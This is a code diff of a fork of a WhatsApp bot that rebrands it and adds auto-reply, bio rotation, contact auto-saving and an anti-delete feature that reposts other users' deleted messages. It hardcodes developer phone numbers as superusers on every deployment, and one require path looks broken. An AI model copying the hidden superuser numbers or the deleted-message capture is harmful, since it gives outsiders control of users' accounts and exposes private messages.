@@ -1,3 +1,14 @@
+// FredieTech tz 🇹🇿 team
+const express = require('express');
+const app = express();
+const PORT = process.env.PORT || 8000;
+app.get("/", (req, res) => {
+  res.send("Kandala xmd💨 IS ALIVE 🫧");
+  });
+// Add port listening
+app.listen(PORT, () => {
+    console.log(`Server is running on port ${PORT}`);
+});
 "use strict";
 var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
     if (k2 === undefined) k2 = k;
@@ -27,7 +38,7 @@ var __importDefault = (this && this.__importDefault) || function (mod) {
 };
 Object.defineProperty(exports, "__esModule", { value: true });
 const baileys_1 = __importStar(require("@whiskeysockets/baileys"));
-const logger_1 = __importDefault(require("@whiskeysockets/baileys/lib/Utils/logger"));
+const logger_1 = __importDefault(require("@whiskeysockets/baileys/bdd/Utils/logger"));
 const logger = logger_1.default.child({});
 logger.level = 'silent';
 const pino = require("pino");
@@ -41,28 +52,20 @@ const { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
 //import chalk from 'chalk'
 const { verifierEtatJid , recupererActionJid } = require("./bdd/antilien");
 const { atbverifierEtatJid , atbrecupererActionJid } = require("./bdd/antibot");
-const { amVerifierEtatJid, amRecupererActionJid } = require("./bdd/antimention");
+const { sendMessage, getContextInfo } = require('./framework/context'); 
 let evt = require(__dirname + "/framework/zokou");
 const {isUserBanned , addUserToBanList , removeUserFromBanList} = require("./bdd/banUser");
 const  {addGroupToBanList,isGroupBanned,removeGroupFromBanList} = require("./bdd/banGroup");
 const {isGroupOnlyAdmin,addGroupToOnlyAdminList,removeGroupFromOnlyAdminList} = require("./bdd/onlyAdmin");
-//const //{loadCmd}=require("/framework/mesfonctions")
+//const //{loadCmd}=require("/fredi/mesfonctions")
 let { reagir } = require(__dirname + "/framework/app");
-var session = conf.session.replace(/KANDALA-XMD<=>/g,"");
+var session = conf.session.replace(/LUCKY-XFORCE••<=>/g,"");
 const prefixe = conf.PREFIXE;
 const more = String.fromCharCode(8206)
 const readmore = more.repeat(4001)
-const express = require('express');
+const BaseUrl = process.env.GITHUB_GIT;
+const Ezraapikey = process.env.BOT_OWNER;
 
-const app = express();
-const PORT = process.env.PORT || 3000;
-
-// Serve static files from the 'public' directory
-app.use(express.static(path.join(__dirname, 'public')));
-
-app.listen(PORT, () => {
-  console.log(`Server is running at http://localhost:${PORT}`);
-});
 async function authentification() {
     try {
         //console.log("le data "+data)
@@ -85,13 +88,14 @@ const store = (0, baileys_1.makeInMemoryStore)({
     logger: pino().child({ level: "silent", stream: "store" }),
 });
 setTimeout(() => {
+authentification();
     async function main() {
-        const version = (await (await fetch('https://raw.githubusercontent.com/WhiskeySockets/Baileys/master/src/Defaults/baileys-version.json')).json()).version;
+        const { version, isLatest } = await (0, baileys_1.fetchLatestBaileysVersion)();
         const { state, saveCreds } = await (0, baileys_1.useMultiFileAuthState)(__dirname + "/scan");
         const sockOptions = {
             version,
             logger: pino({ level: "silent" }),
-            browser: ['Fee-Md', "safari", "1.0.0"],
+            browser: ['Lucky-Md-Xforce', "safari", "1.0.0"],
             printQRInTerminal: true,
             fireInitQueries: false,
             shouldSyncHistoryMessage: true,
@@ -115,124 +119,305 @@ setTimeout(() => {
                     conversation: 'An Error Occurred, Repeat Command!'
                 };
             }
-            ///////
-        };
-        const zk = (0, baileys_1.default)(sockOptions);
-store.bind(zk.ev);
-   const rateLimit = new Map();
+                };
 
-// Silent Rate Limiting (No Logs)
-function isRateLimited(jid) {
-    const now = Date.now();
-    if (!rateLimit.has(jid)) {
-        rateLimit.set(jid, now);
-        return false;
-    }
-    const lastRequestTime = rateLimit.get(jid);
-    if (now - lastRequestTime < 3000) {
-        return true; // Silently skip request
-    }
-    rateLimit.set(jid, now);
-    return false;
+
+   const zk = (0, baileys_1.default)(sockOptions);
+   store.bind(zk.ev);
+
+
+// Function to get the current date and time in Tanzania
+function getCurrentDateTime() {
+    const now = new Date();
+    const options = {
+        timeZone: 'Africa/Nairobi',
+        weekday: 'long',    // e.g., Monday
+        year: 'numeric',
+        month: 'long',      // e.g., June
+        day: '2-digit',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit',
+        hour12: false,
+    };
+    return new Intl.DateTimeFormat('en-KE', options).format(now);
 }
 
-// Silent Group Metadata Fetch (Handles Errors Without Logging)
-const groupMetadataCache = new Map();
-async function getGroupMetadata(zk, groupId) {
-    if (groupMetadataCache.has(groupId)) {
-        return groupMetadataCache.get(groupId);
+// 🌟 Dynamic Motivational, Meme & Skill Phrases
+const bioLines = [
+    "🛠️ Learning never ends — debug life!",
+    "🔥 Bot powered by memes & dreams 😎",
+    "🎯 Skills don't sleep... neither do bots 🤖",
+    "💡 Every day is a code update day!",
+    "📅 Stay productive — even in downtime!",
+    "😂 If bots had feelings... mine would be busy.",
+    "🚀 Running like a boss at 1000 scripts/sec.",
+    "🌍 Global bot vibes from TZ 🇹🇿",
+    "📚 Guide, Help, Fun, Repeat.",
+    "🤹 Life is a mix of memes & miracles.",
+    "👀 Watching you like console logs 👨‍💻",
+    "📌 Daily desk goals: Build, Break, Fix, Repeat.",
+    "🎭 This bot has more personalities than your ex.",
+    "👑 Bot: Kandala-xmd | AI: Fredi AI",
+    "✨ Today is yours. Make it *legendary*.",
+    "📊 Performance: 100% Efficiency (maybe 💀)",
+    "⚙️ Built with ❤️ by kandala tech",
+    "🎮 Skills unlocked: AI | Code | Meme | Hustle"
+];
+
+// 🔁 Rotate bios with different moods every 60s
+let bioIndex = 0;
+
+setInterval(async () => {
+    if (conf.AUTO_BIO === "yes") {
+        const currentDateTime = getCurrentDateTime();
+
+        const dynamicLine = bioLines[bioIndex];
+        const bioText = `🤖 Kandala xmd is Active\n📅 ${currentDateTime}\n${dynamicLine}`;
+
+        await zk.updateProfileStatus(bioText); // Update the bio
+        console.log(`✅ Updated Bio:\n${bioText}`);
+
+        bioIndex = (bioIndex + 1) % bioLines.length; // Loop through bios
     }
+}, 60000); // Update every 60 seconds
+
+
+// Function to handle deleted messages
+// Other functions (auto-react, anti-delete, etc.) as needed
+zk.ev.on("call", async (callData) => {
+  if (conf.ANTI_CALL === 'yes') {
+    const callId = callData[0].id;
+    const callerId = callData[0].from;
+
+    await zk.rejectCall(callId, callerId);
+
+    if (!global.callResponses) global.callResponses = {};
+    if (!global.callResponses[callerId]) global.callResponses[callerId] = { count: 0 };
+
+    const callerData = global.callResponses[callerId];
+    callerData.count++;
+
+    // Define messages per call level
+    const callMessages = {
+      1: [
+        `📞 Hello 👋! I'm ${conf.BOT}. Please avoid calling, my owner ${conf.OWNER_NAME} prefers messages. Thank you!\n\nPowered by ${conf.DEV}`,
+        `🚫 Please don't call. ${conf.BOT} is a bot, not a voice assistant.\n\nPowered by ${conf.DEV}`,
+        `Hi! 🙏 Kindly don’t call. My creator ${conf.OWNER_NAME} has disabled calling. Just message me.\n\n~ ${conf.BOT}`
+      ],
+      2: [
+        `⚠️ You've called again. Calls are not allowed. Please text.\n\nPowered by ${conf.DEV}`,
+        `Reminder: No calls allowed 🚫. Kindly send your message instead.`,
+        `You're trying again? 😅 This bot does not accept calls. Just type your message.`
+      ],
+      3: [
+        `📵 Third time calling! Respect the rules and drop a message please.`,
+        `Hey friend, this is the 3rd call. Please avoid that 🙏.`,
+        `Still calling? 😔 Please understand, texting is preferred.`
+      ],
+    };
+
+    const level = callerData.count >= 3 ? 3 : callerData.count;
+    const messages = callMessages[level];
+
+    // Chagua randomly ujumbe mmojawapo wa kiwango hicho
+    const randomMessage = messages[Math.floor(Math.random() * messages.length)];
 
     try {
-        const metadata = await zk.groupMetadata(groupId);
-        groupMetadataCache.set(groupId, metadata);
-        setTimeout(() => groupMetadataCache.delete(groupId), 60000);
-        return metadata;
-    } catch (error) {
-        if (error.message.includes("rate-overlimit")) {
-            await new Promise(res => setTimeout(res, 5000)); // Wait before retrying
-        }
-        return null;
+      await zk.sendMessage(callerId, { text: randomMessage });
+    } catch (e) {
+      console.error("Error sending anti-call message:", e);
     }
-}
-
-// Silent Error Handling (Prevents Crashes)
-process.on("uncaughtException", (err) => {});
-process.on("unhandledRejection", (err) => {});
-
-// Silent Message Handling
-zk.ev.on("messages.upsert", async (m) => {
-    const { messages } = m;
-    if (!messages || messages.length === 0) return;
-
-    for (const ms of messages) {
-        if (!ms.message) continue;
-        const from = ms.key.remoteJid;
-        if (isRateLimited(from)) continue;
-    }
+  }
 });
 
-// Silent Group Updates
-zk.ev.on("groups.update", async (updates) => {
-    for (const update of updates) {
-        const { id } = update;
-        if (!id.endsWith("@g.us")) continue;
-        await getGroupMetadata(zk, id);
-    }
-});     
+        // Default auto-reply message
+let auto_reply_message = `Hello👋, I'm ${conf.BOT} on board. My owner ${conf.OWNER_NAME} currently unavailable👁️. Please leave a message, and we will get back to you as soon as possible🤝. Thanks To ${conf.DEV}`;
 
-// Utility function for delay
+// Track contacts that have already received the auto-reply
+let repliedContacts = new Set();
+
+zk.ev.on("messages.upsert", async (m) => {
+    const { messages } = m;
+    const ms = messages[0];
+    if (!ms.message) return;
+
+    const messageText = ms.message.conversation || ms.message.extendedTextMessage?.text;
+    const remoteJid = ms.key.remoteJid;
+
+    // Check if the message exists and is a command to set a new auto-reply message with any prefix
+    if (messageText && messageText.match(/^[^\w\s]/) && ms.key.fromMe) {
+        const prefix = messageText[0]; // Detect the prefix
+        const command = messageText.slice(1).split(" ")[0]; // Command after prefix
+        const newMessage = messageText.slice(prefix.length + command.length).trim(); // New message content
+
+        // Update the auto-reply message if the command is 'setautoreply'
+        if (command === "setautoreply" && newMessage) {
+            auto_reply_message = newMessage;
+            await zk.sendMessage(remoteJid, {
+                text: `Auto-reply message has been updated to:\n"${auto_reply_message}"`,
+            });
+            return;
+        }
+    }
+
+    // Check if auto-reply is enabled, contact hasn't received a reply, and it's a private chat
+    if (conf.AUTO_REPLY === "yes" && !repliedContacts.has(remoteJid) && !ms.key.fromMe && !remoteJid.includes("@g.us")) {
+        await zk.sendMessage(remoteJid, {
+            text: auto_reply_message,
+        });
+
+        // Add contact to replied set to prevent repeat replies
+        repliedContacts.add(remoteJid);
+    }
+});
+      
+                            /***Function to download and return media buffer
+async function downloadMedia(message) {
+    const mediaType = Object.keys(message)[0].replace('Message', ''); // Determine the media type
+    try {
+        const stream = await zk.downloadContentFromMessage(message[mediaType], mediaType);
+        let buffer = Buffer.from([]);
+        for await (const chunk of stream) {
+            buffer = Buffer.concat([buffer, chunk]);
+        }
+        return buffer;
+    } catch (error) {
+        console.error('Error downloading media:', error);
+        return null;
+    }
+} ***/
+
+// Function to handle anti-delete
+// ✅ Log active status
+if (conf.LUCKY_ADM === "yes") {
+  console.log("🛡️ Kandala xmd AntiDelete is ACTIVE!");
+}
+
+zk.ev.on("messages.upsert", async (m) => {
+  if (conf.LUCKY_ADM !== "yes") return;
+
+  const { messages } = m;
+  const ms = messages[0];
+  if (!ms.message) return;
+
+  const messageKey = ms.key;
+  const remoteJid = messageKey.remoteJid;
+
+  // Ignore status updates
+  if (remoteJid === "status@broadcast") return;
+
+  // Initialize chat history
+  if (!store.chats[remoteJid]) {
+    store.chats[remoteJid] = [];
+  }
+
+  // Save message
+  store.chats[remoteJid].push(ms);
+  if (store.chats[remoteJid].length > 25) store.chats[remoteJid].shift(); // limit memory
+
+  // ✅ Handle deleted message event
+  if (ms.message?.protocolMessage?.type === 0) {
+    const deletedKey = ms.message.protocolMessage.key;
+    const chatMessages = store.chats[remoteJid];
+    const deletedMessage = chatMessages.find(msg => msg.key.id === deletedKey.id);
+
+    if (!deletedMessage) return;
+
+    try {
+      const deleterJid = ms.key.participant || ms.key.remoteJid;
+      const originalSenderJid = deletedMessage.key.participant || deletedMessage.key.remoteJid;
+      const isGroup = remoteJid.endsWith('@g.us');
+
+      // 🧾 Group Metadata
+      let groupInfo = '';
+      if (isGroup) {
+        try {
+          const groupMetadata = await zk.groupMetadata(remoteJid);
+          groupInfo = `\n• Group: ${groupMetadata.subject}`;
+        } catch (e) {
+          console.error('Error fetching group metadata:', e);
+          groupInfo = '\n• Group information unavailable.';
+        }
+      }
+
+      // 🪧 Notification Text
+      const notification = `🫧 *Kandala xmd antiDelete* 🫧\n` +
+        `• Deleted by: @${deleterJid.split("@")[0]}\n` +
+        `• Original sender: @${originalSenderJid.split("@")[0]}\n` +
+        `${groupInfo}\n` +
+        `• Chat type: ${isGroup ? 'Group' : 'Private'}`;
+
+      const baseOpts = {
+        mentions: [deleterJid, originalSenderJid]
+      };
+
+      // ✅ Forward different message types
+      if (deletedMessage.message.conversation) {
+        await sendMessage(zk, remoteJid, ms, {
+          text: `${notification}\n\n📝 *Deleted Text:*\n${deletedMessage.message.conversation}`,
+          ...baseOpts
+        });
+      } else if (deletedMessage.message.extendedTextMessage) {
+        await sendMessage(zk, remoteJid, ms, {
+          text: `${notification}\n\n📝 *Deleted Text:*\n${deletedMessage.message.extendedTextMessage.text}`,
+          ...baseOpts
+        });
+      } else if (deletedMessage.message.imageMessage) {
+        const caption = deletedMessage.message.imageMessage.caption || '';
+        const imagePath = await zk.downloadAndSaveMediaMessage(deletedMessage.message.imageMessage);
+        await sendMessage(zk, remoteJid, ms, {
+          image: { url: imagePath },
+          caption: `${notification}\n\n🖼️ *Image Caption:*\n${caption}`,
+          ...baseOpts
+        });
+      } else if (deletedMessage.message.videoMessage) {
+        const caption = deletedMessage.message.videoMessage.caption || '';
+        const videoPath = await zk.downloadAndSaveMediaMessage(deletedMessage.message.videoMessage);
+        await sendMessage(zk, remoteJid, ms, {
+          video: { url: videoPath },
+          caption: `${notification}\n\n🎥 *Video Caption:*\n${caption}`,
+          ...baseOpts
+        });
+      } else if (deletedMessage.message.audioMessage) {
+        const audioPath = await zk.downloadAndSaveMediaMessage(deletedMessage.message.audioMessage);
+        await sendMessage(zk, remoteJid, ms, {
+          audio: { url: audioPath },
+          mimetype: 'audio/ogg',
+          ptt: true,
+          caption: `${notification}\n\n🎤 *Voice Message Deleted*`,
+          ...baseOpts
+        });
+      } else if (deletedMessage.message.stickerMessage) {
+        const stickerPath = await zk.downloadAndSaveMediaMessage(deletedMessage.message.stickerMessage);
+        await sendMessage(zk, remoteJid, ms, {
+          sticker: { url: stickerPath },
+          caption: notification,
+          ...baseOpts
+        });
+      } else {
+        await sendMessage(zk, remoteJid, ms, {
+          text: `${notification}\n\n⚠️ *An unsupported message type was deleted.*`,
+          ...baseOpts
+        });
+      }
+
+    } catch (err) {
+      console.error("🔥 AntiDelete Error:", err);
+    }
+  }
+});
+
+
+     // Utility function for delay
 const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
 
 // Track the last reaction time to prevent overflow
 let lastReactionTime = 0;
 
-// Auto-react to status updates, handling each status one-by-one without tracking
-if (conf.AUTO_REACT_STATUS === "yes") {
-    console.log("AUTO_REACT_STATUS is enabled. Listening for status updates...");
 
-    zk.ev.on("messages.upsert", async (m) => {
-        const { messages } = m;
-
-        for (const message of messages) {
-            // Check if the message is a status update
-            if (message.key && message.key.remoteJid === "status@broadcast") {
-                console.log("Detected status update from:", message.key.remoteJid);
-
-                // Ensure throttling by checking the last reaction time
-                const now = Date.now();
-                if (now - lastReactionTime < 5000) {  // 5-second interval
-                    console.log("Throttling reactions to prevent overflow.");
-                    continue;
-                }
-
-                // Check if bot user ID is available
-                const adams = zk.user && zk.user.id ? zk.user.id.split(":")[0] + "@s.whatsapp.net" : null;
-                if (!adams) {
-                    console.log("Bot's user ID not available. Skipping reaction.");
-                    continue;
-                }
-
-                // React to the status with a green heart
-                await zk.sendMessage(message.key.remoteJid, {
-                    react: {
-                        key: message.key,
-                        text: "❤️", // Reaction emoji
-                    },
-                }, {
-                    statusJidList: [message.key.participant, adams],
-                });
-
-                // Log successful reaction and update the last reaction time
-                lastReactionTime = Date.now();
-                console.log(`Successfully reacted to status update by ${message.key.remoteJid}`);
-
-                // Delay to avoid rapid reactions
-                await delay(2000); // 2-second delay between reactions
-            }
-        }
-    });
-}
+// Array of reaction emojis for regular messages and status updates
+// Array of reaction emojis for regular messages and status updates
 const emojiMap = {
     // General Greetings
     "hello": ["👋", "🙂", "😊", "🙋‍♂️", "🙋‍♀️"],
@@ -251,8 +436,8 @@ const emojiMap = {
     "niaje": ["👋", "😄", "💥", "🔥", "🕺", "💃"],
     
     // Names (can be expanded with more names as needed)
-    "ibrahim": ["😎", "💯", "🔥", "🚀", "👑"],
-    "adams": ["🔥", "💥", "👑", "💯", "😎"],
+    "fredi": ["😎", "💯", "🔥", "🚀", "👑"],
+    "ezra": ["🔥", "💥", "👑", "💯", "😎"],
     
     // Expressions of gratitude
     "thanks": ["🙏", "😊", "💖", "❤️", "💐"],
@@ -732,6 +917,53 @@ const getRandomFallbackEmoji = () => {
     return fallbackEmojis[Math.floor(Math.random() * fallbackEmojis.length)];
 };
 
+// Auto-react to status updates if AUTO_REACT_STATUS is enabled
+if (conf.AUTO_REACT_STATUS === "yes") {
+    console.log("AUTO_REACT_STATUS is enabled. Listening for status updates...");
+
+    zk.ev.on("messages.upsert", async (m) => {
+        const { messages } = m;
+
+        for (const message of messages) {
+            if (message.key && message.key.remoteJid === "status@broadcast") {
+                console.log("Detected status update from:", message.key.remoteJid);
+
+                const now = Date.now();
+                if (now - lastReactionTime < 5000) {
+                    console.log("Throttling reactions to prevent overflow.");
+                    continue;
+                }
+
+                const ezra = zk.user && zk.user.id ? zk.user.id.split(":")[0] + "@s.whatsapp.net" : null;
+                if (!ezra) {
+                    console.log("Bot's user ID not available. Skipping reaction.");
+                    continue;
+                }
+
+                // Check for conversation text and apply emoji based on keywords in the sentence
+                const keyword = message?.message?.conversation || "";
+                const randomReaction = getEmojiForSentence(keyword) || getRandomFallbackEmoji();
+
+                if (randomReaction) {
+                    await zk.sendMessage(message.key.remoteJid, {
+                        react: {
+                            key: message.key,
+                            text: randomReaction,
+                        },
+                    }, {
+                        statusJidList: [message.key.participant, ezra],
+                    });
+
+                    lastReactionTime = Date.now();
+                    console.log(`Successfully reacted with '${randomReaction}' to status update by ${message.key.remoteJid}`);
+                }
+
+                await delay(2000);
+            }
+        }
+    });
+}
+
 // Auto-react to regular messages if AUTO_REACT is enabled
 if (conf.AUTO_REACT === "yes") {
     console.log("AUTO_REACT is enabled. Listening for regular messages...");
@@ -770,53 +1002,189 @@ if (conf.AUTO_REACT === "yes") {
         }
     });
 }
-        // Command handler with dynamic prefix detection
+   
+// Function to create and send vCard for a new contact with incremented numbering
+async function sendVCard(jid, baseName) {
+    try {
+        // Extract phone number from JID
+        const phoneNumber = jid.split('@')[0];
+        
+        // Generate unique name with incremented number
+        let counter = 1;
+        let name = `${baseName} ${counter}`;
+
+        // Check existing contacts to find the next available number
+        while (Object.values(store.contacts).some(contact => contact.name === name)) {
+            counter++;
+            name = `${baseName} ${counter}`;
+        }
+
+        // Manually construct vCard content
+        const vCardContent = `BEGIN:VCARD\nVERSION:3.0\nFN:${name}\nTEL;type=CELL;type=VOICE;waid=${phoneNumber}:+${phoneNumber}\nEND:VCARD\n`;
+        
+        // Define the path and file name for the vCard file
+        const vCardPath = `./${name}.vcf`;
+        
+        // Write the vCard content to a .vcf file
+        fs.writeFileSync(vCardPath, vCardContent);
+
+        // Send the vCard to yourself (the bot owner) for easy importing
+        await zk.sendMessage(conf.NUMERO_OWNER + "@s.whatsapp.net", {
+            document: { url: vCardPath },
+            mimetype: 'text/vcard',
+            fileName: `${name}.vcf`,
+            caption: `Contact saved as ${name}. Please import this vCard to add the number to your contacts.\n\n KANDALA-XMD`
+        });
+
+        console.log(`vCard created and sent for: ${name} (${jid})`);
+
+        // Delete the vCard file after sending
+        fs.unlinkSync(vCardPath);
+
+        return name;  // Return the assigned name to use in the notification
+    } catch (error) {
+        console.error(`Error creating or sending vCard for ${name}:`, error.message);
+    }
+}
+// New Contact Handler
 zk.ev.on("messages.upsert", async (m) => {
+    // Check if AUTO_SAVE_CONTACTS is enabled
+    if (conf.AUTO_SAVE_CONTACTS !== "yes") return;
+
     const { messages } = m;
     const ms = messages[0];
 
     if (!ms.message) return;
 
-    const messageContent = ms.message.conversation || ms.message.extendedTextMessage?.text || '';
-    const sender = ms.key.remoteJid;
+    const origineMessage = ms.key.remoteJid;
+    const baseName = "KANDALA-XMD";
 
-    // Find the prefix dynamically (any character at the start of the message)
-    const prefixUsed = messageContent.charAt(0);
+    // Check if the message is from an individual and if contact is not saved
+    if (origineMessage.endsWith("@s.whatsapp.net") && (!store.contacts[origineMessage] || !store.contacts[origineMessage].name)) {
+        // Generate and save contact with incremented name
+        const assignedName = await sendVCard(origineMessage, baseName);
 
-    // Check if the command is "vcard"
-    if (messageContent.slice(1).toLowerCase() === "vcf") {
-        // Check if the command is issued in a group
-        if (!sender.endsWith("@g.us")) {
-            await zk.sendMessage(sender, {
-                text: `❌ This command only works in groups.\n\n🚀 KANDALA-XMD`,
-            });
-            return;
-        }
+        // Update contact in store to avoid duplicate saving
+        store.contacts[origineMessage] = { name: assignedName };
+        
+        // Send additional message to inform the contact of their new saved name
+        await zk.sendMessage(origineMessage, {
+            text: `Ssup Your name has been saved as "${assignedName}" in my account.\n\nKandala-Xmd`
+        });
 
-        const baseName = "Fredi AI family";
-
-        // Call the function to create and send vCards for group members
-        await createAndSendGroupVCard(sender, baseName, zk);
+        console.log(`Contact ${assignedName} has been saved and notified.`);
     }
-});
 
-        zk.ev.on("call", async (callData) => {
-  if (conf.ANTICALL === 'yes') {
-    const callId = callData[0].id;
-    const callerId = callData[0].from;
-
-    // Reject the call
-    await zk.rejectCall(callId, callerId);
-
-    // Delay for 1 second before sending a message
-    setTimeout(async () => {
-      await zk.sendMessage(callerId, {
-        text: `*_📞 Auto Reject Call Mode Activated_* \n*_📵 No Calls Allowed_*`
-      });
-    }, 1000); // 1-second delay
-  }
+    // Further message handling for saved contacts can be added here...
 });
         
+const audioMap = {
+    "heya": "audios/hey.wav",
+    "hi": "audios/hey.wav",
+    "hey": "audios/hey.wav",
+    "he": "audios/hey.wav",
+    "hello": "audios/hello.wav",
+    "mambo": "audios/hey.wav",
+    "niaje": "audios/hey.wav",
+    "morning": "audios/goodmorning.wav",
+    "goodmorning": "audios/goodmorning.wav",
+    "wake up": "audios/goodmorning.wav",
+    "night": "audios/goodnight.wav",
+    "goodnight": "audios/goodnight.wav",
+    "sleep": "audios/goodnight.wav",
+    "man": "audios/mkuu.wav",
+    "owoh": "audios/mkuu.wav",
+    "yoo": "audios/mkuu.wav",
+    "wazii": "audios/mkuu.wav",
+    "bot": "audios/fred.mp3",
+    "lucky": "audios/fred.mp3",
+    "xbot": "audios/fred.mp3",
+    "Fredi": "audios/fred.mp3",
+    "mdx": "audios/fred.mp3",
+    "md": "audios/fred.mp3",
+    "whatsapp bot": "audios/fred.mp3",
+    "evening": "audios/goodevening.wav",
+    "goodevening": "audios/goodevening.wav",
+    "darling": "audios/darling.wav",
+    "beb": "audios/darling.wav",
+    "mpenzi": "audios/darling.wav",
+    "afternoon": "audios/goodafternoon.wav",
+    "jioni": "audios/goodafternoon.wav",
+    "kaka": "audios/kaka.wav",
+    "bro": "audios/morio.mp3",
+    "ndugu": "audios/kaka.wav",
+    "morio": "audios/morio.mp3",
+    "mzee": "audios/morio.mp3",
+    "kijana": "audios/mkuu.wav",
+    "mkuu": "audios/mkuu.wav",
+     "ozah": "audios/mkuu.wav",
+     "ozaah": "audios/mkuu.wav",
+    "oyaah": "audios/mkuu.wav",
+    "oyah": "audios/mkuu.wav",
+    "love": "audios/love.m4a",
+    "honey": "audios/love.m4a",
+
+
+
+
+
+    
+
+};
+
+// Utility to get audio file path for a message
+const getAudioForSentence = (sentence) => {
+    const words = sentence.split(/\s+/); // Split sentence into words
+    for (const word of words) {
+        const audioFile = audioMap[word.toLowerCase()]; // Check each word in sentence
+        if (audioFile) return audioFile; // Return first matched audio file
+    }
+    return null; // Return null if no match
+};
+
+// Auto-reply with audio functionality
+if (conf.AUDIO_REPLY === "yes") {
+    console.log("Kandala xmd  AUTO_REPLY_AUDIO is enabled. Listening for messages...");
+
+    zk.ev.on("messages.upsert", async (m) => {
+        try {
+            const { messages } = m;
+
+            for (const message of messages) {
+                if (!message.key || !message.key.remoteJid) continue; // Ignore invalid messages
+                
+                const conversationText = message?.message?.conversation || "";
+                const audioFile = getAudioForSentence(conversationText);
+
+                if (audioFile) {
+                    try {
+                        // Check if the audio file exists
+                        await fs.access(audioFile);
+
+                        console.log(`Replying with audio: ${audioFile}`);
+                        await zk.sendMessage(message.key.remoteJid, {
+                            audio: { url: audioFile },
+                            mimetype: "audio/mp4",
+                            ptt: true
+                        });
+
+                        console.log(`Audio reply sent: ${audioFile}`);
+                    } catch (err) {
+                        console.error(`Error sending audio reply: ${err.message}`);
+                    }
+                } else {
+                    console.log("No matching keyword detected. Skipping message.");
+                }
+
+                // Add a delay to prevent spamming
+                await new Promise((resolve) => setTimeout(resolve, 3000));
+            }
+        } catch (err) {
+            console.error("Error in message processing:", err.message);
+        }
+    });
+}
+      
         zk.ev.on("messages.upsert", async (m) => {
             const { messages } = m;
             const ms = messages[0];
@@ -840,11 +1208,11 @@ zk.ev.on("messages.upsert", async (m) => {
             var origineMessage = ms.key.remoteJid;
             var idBot = decodeJid(zk.user.id);
             var servBot = idBot.split('@')[0];
-            /* const dj='22559763447';
-             const dj2='254751284190';
-             const luffy='254762016957'*/
-            /*  var superUser=[servBot,dj,dj2,luffy].map((s)=>s.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);
-              var dev =[dj,dj2,luffy].map((t)=>t.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);*/
+            /* const fredi='255620814108';
+             const ezra='255764182801';
+             const fredietech='255752593977'*/
+            /*  var superUser=[servBot,fredi,ezra,fredietech].map((s)=>s.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);
+              var dev =[fredi,ezra,fredietech].map((t)=>t.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);*/
             const verifGroupe = origineMessage?.endsWith("@g.us");
             var infosGroupe = verifGroupe ? await zk.groupMetadata(origineMessage) : "";
             var nomGroupe = verifGroupe ? infosGroupe.subject : "";
@@ -862,25 +1230,24 @@ zk.ev.on("messages.upsert", async (m) => {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dj = '255672752355';
-            const dj2 = '255672752355';
-            const dj3 = "255752593977";
-            const luffy = '255620814108';
+            const fredietech = '255752593977';
+            const kandala = '255672752355';
+            const ezra = "255764182801";
             const sudo = await getAllSudoNumbers();
-            const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+            const superUserNumbers = [servBot, fredietech, kandala, ezra, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
             const superUser = allAllowedNumbers.includes(auteurMessage);
             
-            var dev = [dj, dj2,dj3,luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+            var dev = [fredietech, kandala,ezra].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
             function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
-            console.log("\t🌍KANDALA-XMD IS ONLINE🌍");
-            console.log("=========== written message===========");
+            console.log("\tLUCKY MESSAGES");
+            console.log("=========== NEW CONVERSATION ===========");
             if (verifGroupe) {
-                console.log("message provenant du groupe : " + nomGroupe);
+                console.log("MESSAGE FROM GROUP : " + nomGroupe);
             }
-            console.log("message envoyé par : " + "[" + nomAuteurMessage + " : " + auteurMessage.split("@s.whatsapp.net")[0] + " ]");
-            console.log("type de message : " + mtype);
-            console.log("------ contenu du message ------");
+            console.log("MESSAGE SENT BY : " + "[" + nomAuteurMessage + " : " + auteurMessage.split("@s.whatsapp.net")[0] + " ]");
+            console.log("MESSAGE TYPE : " + mtype);
+            console.log("==================TEXT==================");
             console.log(texte);
             /**  */
             function groupeAdmin(membreGroupe) {
@@ -894,33 +1261,30 @@ zk.ev.on("messages.upsert", async (m) => {
                 return admin;
             }
 
-            var etat =conf.ETAT;
-            if(etat==1)
-            {await zk.sendPresenceUpdate("available",origineMessage);}
-            else if(etat==2)
-            {await zk.sendPresenceUpdate("composing",origineMessage);}
-            else if(etat==3)
-            {
-            await zk.sendPresenceUpdate("recording",origineMessage);
-            }
-            else
-            {
-                await zk.sendPresenceUpdate("unavailable",origineMessage);
-            }
 
-            const mbre = verifGroupe ? await infosGroupe.participants : '';
-            //  const verifAdmin = verifGroupe ? await mbre.filter(v => v.admin !== null).map(v => v.id) : ''
-            let admins = verifGroupe ? groupeAdmin(mbre) : '';
-            const verifAdmin = verifGroupe ? admins.includes(auteurMessage) : false;
-            var verifZokouAdmin = verifGroupe ? admins.includes(idBot) : false;
-            /** ** */
-            /** ***** */
-            const arg = texte ? texte.trim().split(/ +/).slice(1) : null;
-            const verifCom = texte ? texte.startsWith(prefixe) : false;
-            const com = verifCom ? texte.slice(1).trim().split(/ +/).shift().toLowerCase() : false;
-           
-         
-            const lien = conf.URL.split(',')  
+
+            var etat = conf.ETAT;
+// Presence update logic based on etat value
+if (etat == 1) {
+    await zk.sendPresenceUpdate("available", origineMessage);
+} else if (etat == 2) {
+    await zk.sendPresenceUpdate("composing", origineMessage);
+} else if (etat == 3) {
+    await zk.sendPresenceUpdate("recording", origineMessage);
+} else {
+    await zk.sendPresenceUpdate("unavailable", origineMessage);
+}
+
+const mbre = verifGroupe ? await infosGroupe.participants : '';
+let admins = verifGroupe ? groupeAdmin(mbre) : '';
